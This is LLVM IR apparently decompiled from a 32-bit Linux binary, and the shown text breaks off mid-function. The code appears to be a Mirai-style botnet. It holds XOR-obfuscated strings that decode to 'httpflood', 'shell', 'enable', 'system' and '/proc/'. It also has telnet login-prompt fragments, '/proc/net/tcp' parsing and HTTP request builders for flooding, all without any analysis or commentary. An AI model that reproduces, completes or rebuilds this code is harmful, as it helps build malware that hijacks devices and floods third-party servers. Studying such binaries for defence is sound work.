source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80567f0.2 = global i32 0
@global_var_8056808.3 = local_unnamed_addr global i32* @global_var_80567f0.2
@global_var_8054b14.5 = constant [4 x i8] c"GET\00"
@global_var_8054aed.6 = constant i32 1210056751
@global_var_8054b1f.7 = constant i32 540737568
@global_var_8054aef.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8054b07.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8054b26.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8054b18.11 = constant [9 x i8] c"Cookie: \00"
@global_var_8054b21.12 = constant [3 x i8] c"; \00"
@global_var_8054b24.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8054b29.14 = constant i32 1952972859
@global_var_8054b2b.15 = constant [5 x i8] c"http\00"
@global_var_8054b3a.16 = constant i32 -1623588825
@global_var_8054b30.17 = constant [5 x i8] c"url=\00"
@global_var_8054b35.18 = constant [5 x i8] c"POST\00"
@global_var_8054b33.19 = constant i32 1330643005
@global_var_8054b50.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_8056964.21 = local_unnamed_addr global i32 0
@global_var_8056960.22 = local_unnamed_addr global i32 0
@global_var_80568e0.23 = local_unnamed_addr global i32 0
@global_var_8056814.24 = local_unnamed_addr global i32 134553280
@global_var_805680c.25 = local_unnamed_addr global i32 -1
@global_var_805695c.27 = local_unnamed_addr global i32 0
@global_var_805696c.28 = local_unnamed_addr global i32 0
@global_var_805696a.29 = local_unnamed_addr global i32 0
@global_var_80568e8.30 = local_unnamed_addr global i32 0
@global_var_80568f4.31 = local_unnamed_addr global i32 0
@global_var_80568ec.32 = local_unnamed_addr global i32 0
@global_var_80568f0.33 = local_unnamed_addr global i32 0
@global_var_8056930.34 = local_unnamed_addr global i32 0
@global_var_805690a.35 = local_unnamed_addr global i32 0
@global_var_8056910.36 = local_unnamed_addr global i32 0
@global_var_8056900.37 = global i32 0
@global_var_8056918.39 = local_unnamed_addr global i32 0
@global_var_8056924.40 = local_unnamed_addr global i32 0
@global_var_8056914.41 = global i32 0
@global_var_805697c.42 = local_unnamed_addr global i32 0
@global_var_8056904.43 = local_unnamed_addr global i32 0
@global_var_805690c.44 = local_unnamed_addr global i32 0
@global_var_8056978.45 = local_unnamed_addr global i32 0
@global_var_8054d25.46 = constant [5 x i8] c"ogin\00"
@global_var_8054d2a.47 = constant [6 x i8] c"enter\00"
@global_var_8054d30.48 = constant [8 x i8] c"assword\00"
@global_var_80568f8.50 = local_unnamed_addr global i32 0
@global_var_8056928.51 = local_unnamed_addr global i32 0
@global_var_80569a0.52 = global i32 0
@global_var_8054d64.54 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_80569b8.55 = local_unnamed_addr global i32 0
@global_var_80569bc.56 = local_unnamed_addr global i32 0
@global_var_8054d71.57 = constant i32 -1644166366
@global_var_80569c0.58 = local_unnamed_addr global i32 0
@global_var_80569c4.59 = local_unnamed_addr global i32 0
@global_var_8056a30.60 = local_unnamed_addr global i32 0
@global_var_8056a34.61 = local_unnamed_addr global i32 0
@global_var_8054d74.62 = constant i32 1308659102
@global_var_8056a38.63 = local_unnamed_addr global i32 0
@global_var_8056a3c.64 = local_unnamed_addr global i32 0
@global_var_8054d77.65 = constant i32 1448168270
@global_var_80569b0.66 = local_unnamed_addr global i32 0
@global_var_80569b4.67 = local_unnamed_addr global i32 0
@global_var_8054d87.68 = constant i32 1381389898
@global_var_80569c8.69 = local_unnamed_addr global i32 0
@global_var_80569cc.70 = local_unnamed_addr global i32 0
@global_var_8054da5.71 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_80569d0.72 = local_unnamed_addr global i32 0
@global_var_80569d4.73 = local_unnamed_addr global i32 0
@global_var_8054dad.74 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_80569d8.75 = local_unnamed_addr global i32 0
@global_var_80569dc.76 = local_unnamed_addr global i32 0
@global_var_8054db3.77 = constant i32 1195772418
@global_var_80569e0.78 = local_unnamed_addr global i32 0
@global_var_80569e4.79 = local_unnamed_addr global i32 0
@global_var_8054dbf.80 = constant [5 x i8] c"\0DDF\22\00"
@global_var_80569e8.81 = local_unnamed_addr global i32 0
@global_var_80569ec.82 = local_unnamed_addr global i32 0
@global_var_8054dc4.83 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_80569f0.84 = local_unnamed_addr global i32 0
@global_var_80569f4.85 = local_unnamed_addr global i32 0
@global_var_8054dcc.86 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_80569f8.87 = local_unnamed_addr global i32 0
@global_var_80569fc.88 = local_unnamed_addr global i32 0
@global_var_8054dd5.89 = constant i32 1836214128
@global_var_8056a00.90 = local_unnamed_addr global i32 0
@global_var_8056a04.91 = local_unnamed_addr global i32 0
@global_var_8054de3.92 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_8056a08.93 = local_unnamed_addr global i32 0
@global_var_8056a0c.94 = local_unnamed_addr global i32 0
@global_var_8054dee.95 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_8056a10.96 = local_unnamed_addr global i32 0
@global_var_8056a14.97 = local_unnamed_addr global i32 0
@global_var_8054f6c.98 = constant i32 437738110
@global_var_8056a18.99 = local_unnamed_addr global i32 0
@global_var_8056a1c.100 = local_unnamed_addr global i32 0
@global_var_8054df9.101 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_8056a20.102 = local_unnamed_addr global i32 0
@global_var_8056a24.103 = local_unnamed_addr global i32 0
@global_var_8054e02.104 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_8056a28.105 = local_unnamed_addr global i32 0
@global_var_8056a2c.106 = local_unnamed_addr global i32 0
@global_var_8054e0e.107 = constant [7 x i8] c"QJGNN\22\00"
@global_var_8056a40.108 = local_unnamed_addr global i32 0
@global_var_8056a44.109 = local_unnamed_addr global i32 0
@global_var_8054e15.110 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_8056a48.111 = local_unnamed_addr global i32 0
@global_var_8056a4c.112 = local_unnamed_addr global i32 0
@global_var_8054e1d.113 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_8056a50.114 = local_unnamed_addr global i32 0
@global_var_8056a54.115 = local_unnamed_addr global i32 0
@global_var_8054e25.116 = constant [4 x i8] c"QJ\22\00"
@global_var_8056a58.117 = local_unnamed_addr global i32 0
@global_var_8056a5c.118 = local_unnamed_addr global i32 0
@global_var_8054e29.119 = constant i32 1280000013
@global_var_8056a60.120 = local_unnamed_addr global i32 0
@global_var_8056a64.121 = local_unnamed_addr global i32 0
@global_var_8054e3d.122 = constant i32 1668311919
@global_var_8056a68.123 = local_unnamed_addr global i32 0
@global_var_8056a6c.124 = local_unnamed_addr global i32 0
@global_var_8054e56.125 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_8056a70.126 = local_unnamed_addr global i32 0
@global_var_8056a74.127 = local_unnamed_addr global i32 0
@global_var_8054e60.128 = constant i32 1280000013
@global_var_8056a78.129 = local_unnamed_addr global i32 0
@global_var_8056a7c.130 = local_unnamed_addr global i32 0
@global_var_8054e71.131 = constant i32 1280000013
@global_var_8056a80.132 = local_unnamed_addr global i32 0
@global_var_8056a84.133 = local_unnamed_addr global i32 0
@global_var_8054e88.134 = constant i32 1464693110
@global_var_8056a88.135 = local_unnamed_addr global i32 0
@global_var_8056a8c.136 = local_unnamed_addr global i32 0
@global_var_8054e9e.137 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8056a90.138 = local_unnamed_addr global i32 0
@global_var_8056a94.139 = local_unnamed_addr global i32 0
@global_var_8054eb0.140 = constant i32 1196376908
@global_var_8056a98.141 = local_unnamed_addr global i32 0
@global_var_8056a9c.142 = local_unnamed_addr global i32 0
@global_var_8054ebd.143 = constant i32 1280068961
@global_var_8056aa0.144 = local_unnamed_addr global i32 0
@global_var_8056aa4.145 = local_unnamed_addr global i32 0
@global_var_8054f90.146 = constant i32 1195458915
@global_var_8056aa8.147 = local_unnamed_addr global i32 0
@global_var_8056aac.148 = local_unnamed_addr global i32 0
@global_var_8054fe4.149 = constant i32 1195458915
@global_var_8056ab0.150 = local_unnamed_addr global i32 0
@global_var_8056ab4.151 = local_unnamed_addr global i32 0
@global_var_8055008.152 = constant i32 1447841121
@global_var_8056ab8.153 = local_unnamed_addr global i32 0
@global_var_8056abc.154 = local_unnamed_addr global i32 0
@global_var_8054ed5.155 = constant i32 1633044305
@global_var_8056ac0.156 = local_unnamed_addr global i32 0
@global_var_8056ac4.157 = local_unnamed_addr global i32 0
@global_var_8054ee2.158 = constant i32 1346651984
@global_var_8056ac8.159 = local_unnamed_addr global i32 0
@global_var_8056acc.160 = local_unnamed_addr global i32 0
@global_var_8054eec.161 = constant i32 1128353102
@global_var_8056ad0.162 = local_unnamed_addr global i32 0
@global_var_8056ad4.163 = local_unnamed_addr global i32 0
@global_var_8054ef7.164 = constant i32 257312593
@global_var_8056ad8.165 = local_unnamed_addr global i32 0
@global_var_8056adc.166 = local_unnamed_addr global i32 0
@global_var_8054f04.167 = constant i32 1447841089
@global_var_8056ae0.168 = local_unnamed_addr global i32 0
@global_var_8056ae4.169 = local_unnamed_addr global i32 0
@global_var_8054f15.170 = constant i32 1279479894
@global_var_8056ae8.171 = local_unnamed_addr global i32 0
@global_var_8056aec.172 = local_unnamed_addr global i32 0
@global_var_8054f29.173 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8056af0.174 = local_unnamed_addr global i32 0
@global_var_8056af4.175 = local_unnamed_addr global i32 0
@global_var_8054ec9.176 = constant i32 1380403017
@global_var_8056af8.177 = local_unnamed_addr global i32 0
@global_var_8056afc.178 = local_unnamed_addr global i32 0
@global_var_8054f32.179 = constant i32 1280068929
@global_var_8056b00.180 = local_unnamed_addr global i32 0
@global_var_8056b04.181 = local_unnamed_addr global i32 0
@global_var_8054f3f.182 = constant i32 1414547281
@global_var_8056b08.183 = local_unnamed_addr global i32 0
@global_var_8056b0c.184 = local_unnamed_addr global i32 0
@global_var_8054f52.185 = constant i32 1414547281
@global_var_8056b10.186 = local_unnamed_addr global i32 0
@global_var_8056b14.187 = local_unnamed_addr global i32 0
@global_var_805503c.188 = constant i32 1264078191
@global_var_8056b18.189 = local_unnamed_addr global i32 0
@global_var_8056b1c.190 = local_unnamed_addr global i32 0
@global_var_80550ac.191 = constant i32 1264078191
@global_var_8056b20.192 = local_unnamed_addr global i32 0
@global_var_8056b24.193 = local_unnamed_addr global i32 0
@global_var_805511c.194 = constant i32 1264078191
@global_var_8056b28.195 = local_unnamed_addr global i32 0
@global_var_8056b2c.196 = local_unnamed_addr global i32 0
@global_var_805518c.197 = constant i32 1264078191
@global_var_8056b30.198 = local_unnamed_addr global i32 0
@global_var_8056b34.199 = local_unnamed_addr global i32 0
@global_var_80551fc.200 = constant i32 1264078191
@global_var_8056b38.201 = local_unnamed_addr global i32 0
@global_var_8056b3c.202 = local_unnamed_addr global i32 0
@global_var_8056954.203 = global i32 0
@global_var_8056b40.204 = global i32 0
@global_var_8056820.205 = global i32 0
@global_var_8056bec.207 = global i32 0
@global_var_8056bf0.208 = local_unnamed_addr global i32 0
@global_var_8056bf4.209 = global i32 0
@global_var_8056c00.210 = local_unnamed_addr global i32 0
@global_var_8056ef4.211 = global i32 0
@global_var_8056f1c.212 = local_unnamed_addr global i32 0
@global_var_8056f0c.213 = local_unnamed_addr global i32 0
@global_var_8056f10.214 = local_unnamed_addr global i32 0
@global_var_8056f14.215 = local_unnamed_addr global i32 0
@global_var_8056f18.216 = local_unnamed_addr global i32 0
@global_var_8056f24.217 = local_unnamed_addr global i32 0
@global_var_8056f30.218 = local_unnamed_addr global i32 0
@global_var_8056f28.219 = local_unnamed_addr global i32 0
@global_var_8056f34.220 = local_unnamed_addr global i32 0
@global_var_8056f08.221 = local_unnamed_addr global i32 0
@global_var_8056f04.223 = local_unnamed_addr global i32 0
@global_var_8056f2c.224 = local_unnamed_addr global i32 0
@global_var_8056bfc.225 = local_unnamed_addr global i32 0
@global_var_8056838.226 = global i32 0
@global_var_80555e0.228 = constant i32 33554944
@global_var_805686c.229 = local_unnamed_addr global i32* @global_var_80555e0.228
@global_var_8056850.230 = global i32 0
@global_var_8056938.231 = local_unnamed_addr global i32 0
@global_var_80567e4.233 = global i32 -1
@global_var_8054089.234 = constant i32 -294069
@global_var_8056948.235 = local_unnamed_addr global i32 0
@global_var_805694c.236 = local_unnamed_addr global i32 0
@global_var_80554cc.237 = constant [10 x i8] c"/dev/null\00"
@global_var_8056944.239 = local_unnamed_addr global i32 0
@global_var_805693c.240 = local_unnamed_addr global i32 0
@global_var_8056940.241 = local_unnamed_addr global i32 0
@global_var_8054d73.242 = constant i32 9281024
@global_var_8056868.243 = local_unnamed_addr global i32* @global_var_8054d73.242
@global_var_805426f.244 = constant i32 1928542531
@global_var_8054293.245 = constant i32 1928542531
@global_var_8056958.246 = local_unnamed_addr global i32 0
@global_var_8056f38.247 = local_unnamed_addr global i32 0
@global_var_8056f3c.248 = local_unnamed_addr global i32 0
@global_var_8056880.1 = local_unnamed_addr global i8 0
@global_var_8056818.26 = local_unnamed_addr global i8 1
@global_var_8056916.38 = local_unnamed_addr global i16 0
@global_var_805692c.49 = local_unnamed_addr global i16 0
@global_var_805681c.53 = local_unnamed_addr global i16 -16657
@global_var_8056bc0.206 = global i8 0
@global_var_8056f20.222 = local_unnamed_addr global i8 0
@global_var_8056934.227 = local_unnamed_addr global i8 0
@global_var_8056950.238 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 59227
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8054a90()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8056880.1, align 128
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8056808.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8056808.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8056808.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8056880.1, align 128
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8056808.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8056880.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134567904)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134572020 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* %ecx.global-to-local, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8054125(i32 134538704, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134564534, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134564534, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134564534, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8054b14.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp137 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp137, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_8054aed.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805277a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp239 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_8051c50(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_8051c50(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_8051c50(i8* %tmp239)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5213 = call i32 @function_8051c50(i8* %tmp239)
  store i32 %v2_80482a5213, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4214 = icmp eq i32 %v2_80482a5213, 0
  store i1 %v12_80482b4214, i1* %zf.global-to-local, align 1
  %v7_80482b6215 = icmp sgt i32 %v2_80482a5213, 0
